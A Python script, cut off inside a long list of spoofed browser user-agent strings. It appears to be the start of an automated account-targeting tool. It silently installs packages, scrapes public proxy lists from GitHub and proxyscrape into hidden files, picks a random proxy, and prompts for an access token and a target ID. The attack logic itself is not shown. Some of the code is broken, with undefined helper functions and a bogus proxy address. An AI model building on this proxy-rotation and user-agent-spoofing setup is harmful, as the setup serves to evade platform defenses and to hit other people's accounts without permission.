import subprocess
libraries = [
    "urllib3",
    "rich",
    "fake_useragent",
    "beautifulsoup4"
]
for lib in libraries:
    subprocess.check_call(["pip", "install", lib])
import os
import subprocess
from concurrent.futures import ThreadPoolExecutor as tred
import requests,bs4,json,os,sys,random,datetime,time,re,platform
import urllib3,rich,base64
import requests,bs4,json,os,sys,random,datetime,time,re
from urllib import request
import webbrowser
from rich.console import Console as sol
from rich import pretty
from rich.text import Text as tekz
r9 = '\x1b[1;38;5;141m'
r7 = '\x1b[1;38;5;131m'
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[1;94m'  # أزرق سماوي

import sys,time,os
class TBOA1:
    def __init__(self,z):
        for e in z+'\n':
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.0009)

logo=(f'''{a26}
____________________██████
_________▓▓▓▓____█████████
__ Ƹ̵̡Ӝ̵̨̄Ʒ▓▓▓▓▓=▓____▓=▓▓▓▓▓
__ ▓▓▓_▓▓▓▓░●____●░░▓▓▓▓
_▓▓▓▓_▓▓▓▓▓░░__░░░░▓▓▓▓
_ ▓▓▓▓_▓▓▓▓░░♥__♥░░░▓▓▓
__ ▓▓▓___▓▓░░_____░░░▓▓
▓▓▓▓▓____▓░░_____░░▓
_ ▓▓____ ▒▓▒▓▒___ ████
_______ ▒▓▒▓▒▓▒_ ██████
_______▒▓▒▓▒▓▒ ████████
_____ ▒▓▒▓▒▓▒_██████ ███
_ ___▒▓▒▓▒▓▒__██████ _███
_▓▓X▓▓▓▓▓▓▓__██████_ ███
▓▓_██████▓▓__██████_ ███
▓_███████▓▓__██████_ ███
_████████▓▓__██████ _███
_████████▓▓__▓▓▓▓▓▓_▒▒
_████████▓▓__▓▓▓▓▓▓
_████████▓▓__▓▓▓▓▓▓
__████████▓___▓▓▓▓▓▓
_______▒▒▒▒▒____▓▓▓▓▓▓
_______▒▒▒▒▒ _____▓▓▓▓▓
_______▒▒▒▒▒_____ ▓▓▓▓▓
_______▒▒▒▒▒ _____▓▓▓▓▓
________▒▒▒▒______▓▓▓▓▓
________█████____█████
_'▀█║────────────▄▄───────────​─▄──▄_
──█║───────▄─▄─█▄▄█║──────▄▄──​█║─█║
──█║───▄▄──█║█║█║─▄║▄──▄║█║─█║​█║▄█║
──█║──█║─█║█║█║─▀▀──█║─█║█║─█║​─▀─▀
──█║▄║█║─█║─▀───────█║▄█║─▀▀
──▀▀▀──▀▀────────────▀─█║
───────▄▄─▄▄▀▀▄▀▀▄──▀▄▄▀
──────███████───▄▀
──────▀█████▀▀▄▀
────────▀█▀

''')
def clear():
    os.system('clear')
def i():
    TBOA1(logo)
i()

proxy = request.ProxyHandler(
{"http":"167.0.0.1:443"}
)
request.install_opener(request.build_opener(proxy))

import requests
try: 
   TPARK1 = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
   TPARK2 = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt').text   
   TPARK3 = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt').text
   TPARK4 = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text
   TPARK5 = requests.get('https://raw.githubusercontent.com/James404-cyber/binnos/main/socks5.txt').text
   TPARK6 = requests.get('https://raw.githubusercontent.com/James404-cyber/binnos/main/socks4.txt').text   
except Exception as e:
 pass
proxx = open('.prox1.txt','w').write(TPARK1)
proxx = open('.prox2.txt','w').write(TPARK2)
proxx = open('.prox3.txt','w').write(TPARK3)
proxx = open('.prox4.txt','w').write(TPARK4)
proxx = open('.prox5.txt','w').write(TPARK5)
proxx = open('.prox6.txt','w').write(TPARK6)
a = random.choice([TPARK1,TPARK2,TPARK3,TPARK4,TPARK5,TPARK6])

if TPARK1 in a:
 prox = open('.prox1.txt','r').read().splitlines()
elif TPARK2 in a:
 prox = open('.prox2.txt','r').read().splitlines() 
elif TPARK3 in a:
 prox = open('.prox3.txt','r').read().splitlines()
elif TPARK4 in a:
 prox = open('.prox4.txt','r').read().splitlines()
elif TPARK5 in a:
 prox = open('.prox5.txt','r').read().splitlines()
elif TPARK6 in a:
 prox = open('.prox6.txt','r').read().splitlines()
try:
        
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	print('')
Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
ses = requests.Session()
F = '\033[2;32m'
Z = '\033[1;31m' 
L = "\033[1;95m"  #ارجواني
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
print('\n')
token = input('\x1b[1;31m  T \x1b[1;32m O \x1b[1;34m K \x1b[1;32m E \x1b[1;32m N \x1b[1;36m :\x1b[1;34m ')
ID = input('\x1b[1;31m  I \x1b[1;34m D  \x1b[1;32m   : ')
os.system('clear')
pretty.install()
CON=sol()
ugen=['Mozilla/5.0 (Linux; Android 5.1; LYO-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.56 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25 (Edition Campaign 67)', 'Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-N960F) AppleWebKit/537.36 (KHTML like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-J337P) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; BND-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A605FN) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-J701M) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; BLN-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-N950N) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; L270) AppleWebKit/537.36 (KHTML like Gecko) Chrome/71.0.3578.99 YaBrowser/19.1.2.337.01 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A600FN) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; PRA-TL10 Build/HONORPRA-TL10) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Version/13.0 YaBrowser/19.12.4.77.10 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 4.4.2; K016) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-J730FM) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; RNE-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; YAL-L41) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-A320FL) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; KSA-LX9) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A202F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; HUAWEI LUA-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; DUA-L22) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; E5533) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; IMPRESS CLICK) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; RE1 Build/O11019) AppleWebKit/537.36 (KHTML like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36 YaApp_Android/9.50 YaSearchBrowser/9.50', 'Mozilla/5.0 (Linux; Android 9; ZTE Blade A7 2020) AppleWebKit/537.36 (KHTML like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; JMM-L22 Build/HUAWEIJMM-L22) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36 YaApp_Android/9.90 YaSearchBrowser/9.90', 'Mozilla/5.0 (Linux; Android 7.0; AGS-L09 Build/HUAWEIAGS-L09) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36 YaApp_Android/9.90/apad YaSearchBrowser/9.90', 'Mozilla/5.0 (Linux; Android 6.0; LG-K430) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; SM-A260G Build/OPR6) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; moto x4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG-SM-J727A) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; U504TL Build/U452TL_01.01.02; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; LM-X420) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; moto g(7) play) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6000) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.2; KFMUWI) AppleWebKit/537.36 (KHTML like Gecko) Silk/75.3.60 like Chrome/75.0.3770.101 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44', 'Mozilla/5.0 (Linux; Android 4.4.4; SM-G360H) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/64.0.3417.172', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1719) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/58.0.2991.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.4; SM-T560) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.66 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; INE-LX2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; ONEPLUS A5010 Build/PKQ1.180716.001; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) coc_coc_browser/85.0.130 Chrome/79.0.3945.130 Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; ASUS_Z00AD) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A530F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; MYA-L41) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML like Gecko) coc_coc_browser/85.0.130 Chrome/79.0.3945.130 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; CPH1923) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; Ilium X110 Build/KOT49H) AppleWebKit/537.36 (KHTML like Gecko) Chrome/40.0.2214.109 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:52.9) Gecko/20100101 Goanna/3.4 Firefox/52.9 ArcticFox/27.9.19', 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44 (Edition Yx)', 'Mozilla/5.0 (Linux; Android 9; JSN-L21) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/68.0.3440.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; moto g(8) plus) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; RMX1805) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; GM 8 d) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.79 Safari/537.36 CCleaner/79.0.3067.82', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.120 Safari/537.36 Avast/77.2.2167.120', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.79 Safari/537.36 AVG/79.0.3064.81', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.79 Safari/537.36 CCleaner/79.0.3067.82', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.79 Safari/537.36 AVG/79.0.3064.81', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.79 Safari/537.36 CCleaner/79.0.3066.82', 'Mozilla/5.0 (Linux; Android 9; Moto Z3 Play) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; Moto G (4)) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A305F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.0.10) Gecko/20060911 SUSE/1.5.0.10-0.2 Firefox/52.7.0', 'Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.1.8) Gecko/20100214 Ubuntu/9.10 (karmic) Firefox/52.5.0', 'Mozilla/5.0 (Linux; Android 9; Mi 9 SE) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; RMX1821) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-A910F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; JSN-L22) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A105F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; Pixel 3a) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; CPH1613) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A1601) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.4; ML12-M7SQC-KIDPAD Build/KTU84Q) AppleWebKit/537.36 (KHTML like Gecko) Chrome/40.0.2214.109 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A105FN) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-A705FN) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; XT1635-02) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.1; .NET4.0C; Zoom 3.6.0)', 'Mozilla/5.0 (Linux; U; Android 8.1.0; SM-A260F Build/OPR6; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 OPR/46.0.2254.145391', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44 (Edition Campaign 34)', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Linux; U; Android 4.1.2; zh-cn; GT-S7572 Build/JZO54K) AppleWebKit/534.30 (KHTML like Gecko) Version/4.0 Mobile Safari/534.30 MicroMessenger/5.0.2.352', 'Mozilla/5.0 (Linux; U; Android 4.3; zh-cn; M811 Build/JLS36C) AppleWebKit/534.30 (KHTML like Gecko) Version/4.0 Mobile Safari/534.30; 360browser(securitypaysecurityinstalled); 360(androiduppayplugin); 360 Aphone Browser (2.0.4)', 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone72;FBMD/iPhone;FBSN/iOS;FBSV/12.4.4;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5;FBCR/Mobile TeleSystems]', 'Mozilla/5.0 (Linux; Android 9; SM-A405FM) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G973U) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; PRO 6) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; TECNO KC8 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 YandexSearch/7.80 YandexSearchBrowser/7.80', 'Mozilla/5.0 (Linux; Android 7.0; R2 Plus) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi Go) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Redmi 3S Build/MMB29M) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; PSP5506DUO) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G9350) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.94 Mobile Safari/537.36 Vivaldi/2.9.1741.39', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44 (Edition Yx)', 'Mozilla/5.0 (Linux; Android 9; G8441) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu note9 Build/MRA58K) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.13.110-2019112819 UWS/2.15.0.4 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; SM-J260F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SM-J600F) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; AUM-L29) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; COL-L29) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; Mi 9 SE Build/PKQ1.181121.001) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36 YaApp_Android/9.90 YaSearchBrowser/9.90', 'Mozilla/5.0 (Linux; Android 9; Moto Z (2)) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; Xerox_Win32PWS; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 9; SM-A750FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 YaApp_Android/9.90 YaSearchBrowser/9.90', 'Mozilla/5.0 (Linux; Android 7.1.2; Swift 2 X) AppleWebKit/537.36 (KHTML like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 9; en-in; 